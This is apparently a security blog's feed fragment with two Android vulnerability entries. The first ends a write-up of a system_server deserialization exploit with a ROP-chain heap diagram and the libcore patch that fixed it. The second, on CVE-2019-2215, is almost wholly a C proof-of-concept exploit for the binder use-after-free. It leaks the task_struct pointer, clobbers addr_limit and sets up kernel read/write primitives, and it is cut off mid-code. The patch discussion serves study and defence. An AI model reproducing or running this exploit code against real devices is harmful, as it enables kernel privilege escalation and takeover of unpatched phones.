|</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |       SA        |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |   <span class="number">0xdeadbeef</span>    |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |   ROP chain <span class="number">0</span>   |</span><br><span class="line">                 +-----------------+</span><br><span class="line">     Gadget      |   <span class="number">0xdeadbeef</span>    |</span><br><span class="line">                 +-----------------+</span><br><span class="line">     Buffer      |   ROP chain <span class="number">1</span>   |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |   <span class="number">0xdeadbeef</span>    |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |   ROP chain <span class="number">2</span>   |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |   <span class="number">0xdeadbeef</span>    |</span><br><span class="line">                 +-----------------+</span><br><span class="line">                 |   ROP chain <span class="number">3</span>   |</span><br><span class="line">+----------------+-----------------+`</span><br></pre></td></tr></table></figure><p>0x3 触发漏洞： 通过Receiver布置好堆，让system_server触发反序列化了。为此，我们将伪造的序列化字符串发送至system_server。system_server在将其反序列化后，得到伪造的<code>BinderProxy</code>。随后，在该对象被回收时，触发<code>finalize()</code>方法，进行访问我们设置的<code>mOrgue</code>，最后跳到设置好的的堆上，完成代码执行。</p><h2 id="补丁："><a href="#补丁：" class="headerlink" title="补丁："></a>补丁：</h2><p> <code>Class&lt;?&gt; objectClass = classDesc.checkAndGetTcObjectClass();</code></p><p>对比之前版本知道，最后<code>classDesc.checkAndGetTcObjectClass()</code>这里就是补丁代码了，进去<code>checkAndGetTcObjectClass()</code>看到上边几行注释</p><p>&#96;&#x2F;**</p><ul><li>Checks the local class to make sure it is valid for {@link ObjectStreamConstants#TC_OBJECT}</li><li>deserialization. Also performs some sanity checks of the stream data. This method is used</li><li>during deserialization to confirm the local class is likely to be compatible with the coming</li><li>stream data, but before an instance is instantiated.</li><li></li><li>@hide used internally during deserialization<br> *&#x2F;&#96;</li></ul><p>注释也很清楚了说明了，这是加的一个补丁，在数据被实例化之前，用来检测对象是否可被反序列化。更详细的补丁代码可以查看：<a href="https://github.com/CyanogenMod/android_libcore/commit/2d0fbea07c1a3c4368ddb07609d1a86993ed6de9">2d0fbea07c1a3c4368ddb07609d1a86993ed6de9</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAndGetTcObjectClass() <span class="keyword">throws</span> InvalidClassException &#123;</span><br><span class="line">+        <span class="comment">// We check some error possibilities that might cause problems later.</span></span><br><span class="line">+        <span class="type">boolean</span> <span class="variable">wasSerializable</span> <span class="operator">=</span> (flags &amp; ObjectStreamConstants.SC_SERIALIZABLE) != <span class="number">0</span>;</span><br><span class="line">+        <span class="type">boolean</span> <span class="variable">wasExternalizable</span> <span class="operator">=</span> (flags &amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != <span class="number">0</span>;</span><br><span class="line">+        <span class="keyword">if</span> (wasSerializable == wasExternalizable) &#123;</span><br><span class="line">+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">+                    getName() + <span class="string">&quot; stream data is corrupt: SC_SERIALIZABLE=&quot;</span> + wasSerializable</span><br><span class="line">+                            + <span class="string">&quot; SC_EXTERNALIZABLE=&quot;</span> + wasExternalizable</span><br><span class="line">+                            + <span class="string">&quot;, classDescFlags must have one or the other&quot;</span>);</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">+        <span class="comment">// TC_ENUM is handled elsewhere. See checkAndGetTcEnumClass().</span></span><br><span class="line">+        <span class="keyword">if</span> (isEnum()) &#123;</span><br><span class="line">+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">+                    getName() + <span class="string">&quot; local class is incompatible: Local class is an enum, streamed&quot;</span></span><br><span class="line">+                            + <span class="string">&quot; data is tagged with TC_OBJECT&quot;</span>);</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">+        <span class="comment">// isSerializable() is true if the local class implements Serializable. Externalizable</span></span><br><span class="line">+        <span class="comment">// classes are also Serializable via inheritance.</span></span><br><span class="line">+        <span class="keyword">if</span> (!isSerializable()) &#123;</span><br><span class="line">+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(getName() + <span class="string">&quot; local class is incompatible: Not&quot;</span></span><br><span class="line">+                    + <span class="string">&quot; Serializable&quot;</span>);</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">+        <span class="comment">// The stream class was externalizable, but is only serializable locally.</span></span><br><span class="line">+        <span class="keyword">if</span> (wasExternalizable != isExternalizable()) &#123;</span><br><span class="line">+            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">+                    getName() + <span class="string">&quot; local class is incompatible: Local class is Serializable, stream&quot;</span></span><br><span class="line">+                            + <span class="string">&quot; data requires Externalizable&quot;</span>);</span><br><span class="line">+        &#125;</span><br><span class="line">+</span><br><span class="line">+        <span class="comment">// The following are left unchecked and thus are treated leniently at this point.</span></span><br><span class="line">+        <span class="comment">// SC_BLOCK_DATA may be set iff SC_EXTERNALIZABLE is set AND version 2 of the protocol is in</span></span><br><span class="line">+        <span class="comment">// use.</span></span><br><span class="line">+        <span class="comment">// SC_ENUM should not be set.</span></span><br><span class="line">+</span><br><span class="line">+        <span class="keyword">return</span> forClass();</span><br><span class="line">+    &#125;</span><br></pre></td></tr></table></figure><p><a href="https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2%5E%21/#F0">https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2^!&#x2F;#F0</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-2215:Android内核binder漏洞</title>
      <link href="/2023/06/29/CVE-2019-2215-Android%E5%86%85%E6%A0%B8binder%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/06/29/CVE-2019-2215-Android%E5%86%85%E6%A0%B8binder%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<ul><li><p>poc</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINDER_THREAD_EXIT 0x40046208ul</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> we don&#x27;t cover the task_struct* here; we want to leave it uninitialized</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINDER_THREAD_SZ 0x190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) <span class="comment">//25</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WAITQUEUE_OFFSET 0xA0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) <span class="comment">//10</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump_memory</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">size_t</span> byte_count)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> byte_offset_start = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (byte_count % <span class="number">16</span>)</span><br><span class="line">    errx(<span class="number">1</span>, <span class="string">&quot;hexdump_memory called with non-full line&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> byte_offset = byte_offset_start; byte_offset &lt; byte_offset_start + byte_count;</span><br><span class="line">          byte_offset += <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">1000</span>];</span><br><span class="line">    <span class="type">char</span> *linep = line;</span><br><span class="line">    linep += <span class="built_in">sprintf</span>(linep, <span class="string">&quot;%08lx  &quot;</span>, byte_offset);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">16</span>; i++) &#123;</span><br><span class="line">      linep += <span class="built_in">sprintf</span>(linep, <span class="string">&quot;%02hhx &quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>)buf[byte_offset + i]);</span><br><span class="line">    &#125;</span><br><span class="line">    linep += <span class="built_in">sprintf</span>(linep, <span class="string">&quot; |&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">16</span>; i++) &#123;</span><br><span class="line">      <span class="type">char</span> c = buf[byte_offset + i];</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">isalnum</span>(c) || <span class="built_in">ispunct</span>(c) || c == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">        *(linep++) = c;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *(linep++) = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    linep += <span class="built_in">sprintf</span>(linep, <span class="string">&quot;|&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(line);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> epfd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *dummy_page_4g_aligned;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> current_ptr;</span><br><span class="line"><span class="type">int</span> binder_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_task_struct</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123; .events = EPOLLIN &#125;;</span><br><span class="line">  <span class="keyword">if</span> (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &amp;event)) err(<span class="number">1</span>, <span class="string">&quot;epoll_add&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovec_array</span>[<span class="title">IOVEC_ARRAY_SZ</span>];</span></span><br><span class="line">  <span class="built_in">memset</span>(iovec_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(iovec_array));</span><br><span class="line"></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; <span class="comment">/* spinlock in the low address half must be zero */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">0x1000</span>; <span class="comment">/* wq-&gt;task_list-&gt;next */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">/* wq-&gt;task_list-&gt;prev */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> b;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> (pipe(pipefd)) err(<span class="number">1</span>, <span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fcntl(pipefd[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>) != <span class="number">0x1000</span>) err(<span class="number">1</span>, <span class="string">&quot;pipe size&quot;</span>);</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> page_buffer[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="comment">//if (write(pipefd[1], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, &quot;fill pipe&quot;);</span></span><br><span class="line"></span><br><span class="line">  <span class="type">pid_t</span> fork_ret = fork();</span><br><span class="line">  <span class="keyword">if</span> (fork_ret == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">&quot;fork&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fork_ret == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">/* Child process */</span></span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CHILD: Doing EPOLL_CTL_DEL.\n&quot;</span>);</span><br><span class="line">    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &amp;event);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CHILD: Finished EPOLL_CTL_DEL.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// first page: dummy data</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipefd[<span class="number">0</span>], page_buffer, <span class="keyword">sizeof</span>(page_buffer)) != <span class="keyword">sizeof</span>(page_buffer)) err(<span class="number">1</span>, <span class="string">&quot;read full pipe&quot;</span>);</span><br><span class="line">    close(pipefd[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CHILD: Finished write to FIFO.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//printf(&quot;PARENT: Calling READV\n&quot;);</span></span><br><span class="line">  ioctl(binder_fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">  b = writev(pipefd[<span class="number">1</span>], iovec_array, IOVEC_ARRAY_SZ);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;writev() returns 0x%x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)b);</span><br><span class="line">  <span class="comment">// second page: leaked data</span></span><br><span class="line">  <span class="keyword">if</span> (read(pipefd[<span class="number">0</span>], page_buffer, <span class="keyword">sizeof</span>(page_buffer)) != <span class="keyword">sizeof</span>(page_buffer)) err(<span class="number">1</span>, <span class="string">&quot;read full pipe&quot;</span>);</span><br><span class="line">  <span class="comment">//hexdump_memory((unsigned char *)page_buffer, sizeof(page_buffer));</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;PARENT: Finished calling READV\n&quot;</span>);</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="keyword">if</span> (wait(&amp;status) != fork_ret) err(<span class="number">1</span>, <span class="string">&quot;wait&quot;</span>);</span><br><span class="line"></span><br><span class="line">  current_ptr = *(<span class="type">unsigned</span> <span class="type">long</span> *)(page_buffer + <span class="number">0xe8</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;current_ptr == 0x%lx\n&quot;</span>, current_ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clobber_addr_limit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span> =</span> &#123; .events = EPOLLIN &#125;;</span><br><span class="line">  <span class="keyword">if</span> (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &amp;event)) err(<span class="number">1</span>, <span class="string">&quot;epoll_add&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovec_array</span>[<span class="title">IOVEC_ARRAY_SZ</span>];</span></span><br><span class="line">  <span class="built_in">memset</span>(iovec_array, <span class="number">0</span>, <span class="keyword">sizeof</span>(iovec_array));</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> second_write_chunk[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="comment">/* iov_len */</span></span><br><span class="line">    <span class="number">0xdeadbeef</span>, <span class="comment">/* iov_base (already used) */</span></span><br><span class="line">    <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>, <span class="comment">/* iov_len (already used) */</span></span><br><span class="line">    current_ptr + <span class="number">0x8</span>, <span class="comment">/* next iov_base (addr_limit) */</span></span><br><span class="line">    <span class="number">8</span>, <span class="comment">/* next iov_len (sizeof(addr_limit)) */</span></span><br><span class="line">    <span class="number">0xfffffffffffffffe</span> <span class="comment">/* value to write */</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; <span class="comment">/* spinlock in the low address half must be zero */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = <span class="number">1</span>; <span class="comment">/* wq-&gt;task_list-&gt;next */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xDEADBEEF</span>; <span class="comment">/* wq-&gt;task_list-&gt;prev */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len = <span class="number">0x8</span> + <span class="number">2</span> * <span class="number">0x10</span>; <span class="comment">/* iov_len of previous, then this element and next element */</span></span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_base = (<span class="type">void</span> *)<span class="number">0xBEEFDEAD</span>;</span><br><span class="line">  iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_len = <span class="number">8</span>; <span class="comment">/* should be correct from the start, kernel will sum up lengths when importing */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> socks[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socks)) err(<span class="number">1</span>, <span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (write(socks[<span class="number">1</span>], <span class="string">&quot;X&quot;</span>, <span class="number">1</span>) != <span class="number">1</span>) err(<span class="number">1</span>, <span class="string">&quot;write socket dummy byte&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">pid_t</span> fork_ret = fork();</span><br><span class="line">  <span class="keyword">if</span> (fork_ret == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">&quot;fork&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fork_ret == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">/* Child process */</span></span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CHILD: Doing EPOLL_CTL_DEL.\n&quot;</span>);</span><br><span class="line">    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &amp;event);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CHILD: Finished EPOLL_CTL_DEL.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (write(socks[<span class="number">1</span>], second_write_chunk, <span class="keyword">sizeof</span>(second_write_chunk)) != <span class="keyword">sizeof</span>(second_write_chunk))</span><br><span class="line">      err(<span class="number">1</span>, <span class="string">&quot;write second chunk to socket&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ioctl(binder_fd, BINDER_THREAD_EXIT, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;</span><br><span class="line">    .msg_iov = iovec_array,</span><br><span class="line">    .msg_iovlen = IOVEC_ARRAY_SZ</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="type">int</span> recvmsg_result = recvmsg(socks[<span class="number">0</span>], &amp;msg, MSG_WAITALL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;recvmsg() returns %d, expected %lu\n&quot;</span>, recvmsg_result,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">long</span>)(iovec_array[IOVEC_INDX_FOR_WQ].iov_len +</span><br><span class="line">      iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">1</span>].iov_len +</span><br><span class="line">      iovec_array[IOVEC_INDX_FOR_WQ + <span class="number">2</span>].iov_len));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> kernel_rw_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_write</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kaddr, <span class="type">void</span> *buf, <span class="type">unsigned</span> <span class="type">long</span> len)</span> &#123;</span><br><span class="line">  errno = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (len &gt; <span class="number">0x1000</span>) errx(<span class="number">1</span>, <span class="string">&quot;kernel writes over PAGE_SIZE are messy, tried 0x%lx&quot;</span>, len);</span><br><span class="line">  <span class="keyword">if</span> (write(kernel_rw_pipe[<span class="number">1</span>], buf, len) != len) err(<span class="number">1</span>, <span class="string">&quot;kernel_write failed to load userspace buffer&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read(kernel_rw_pipe[<span class="number">0</span>], (<span class="type">void</span>*)kaddr, len) != len) err(<span class="number">1</span>, <span class="string">&quot;kernel_write failed to overwrite kernel memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_read</span><span class="params">(<span 